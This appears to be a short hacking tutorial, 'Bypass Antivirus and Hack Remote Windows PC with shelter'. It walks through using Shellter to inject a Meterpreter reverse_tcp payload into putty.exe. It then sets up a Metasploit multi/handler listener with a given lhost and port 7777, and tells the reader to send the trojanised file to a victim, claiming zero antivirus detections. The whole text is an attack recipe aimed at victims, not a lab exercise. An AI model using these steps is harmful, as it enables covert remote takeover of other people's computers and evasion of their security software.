Bypass Antivirus and Hack Remote Windows PC with shelter

Download Shellter from here, shellter version 4.0 is latest release,no antivirus has detected till now.
After downloading shellter unzip the archive file
 set the location of shellter and type “wineconsole shellter” 

A terminal opens and choose operation mode as auto (a)

Now choose an executable file and copy to shellter folder to bind the shellter with any .exe file
 here in my case I have copied putty.exe as a file to bind with shellter.exe
 Note: only executable file can be binded.

Now it asks for PE target after choosing operation method, give the filename .exe and binding process will start.

When the binding is processed it will ask for the type of payload we want to use I have choose l for listed payload and then choose 1 for Meterpreter_reverse_tcp

Now give the lhost which is ip address of kali linux and lport as 7777

After giving all the options you will get a confirmation like Injection: verified! Press enter and continue.

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed. Start metasploit using msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.125
set lport 7777
exploit
Now send the binded putty .exe to the victim, as soon as he opens the file a meterpreter session will open

Proof that no antivirus is detecting, I have scanned putty.exe in virustotal.com and has discovered 0 out of 55
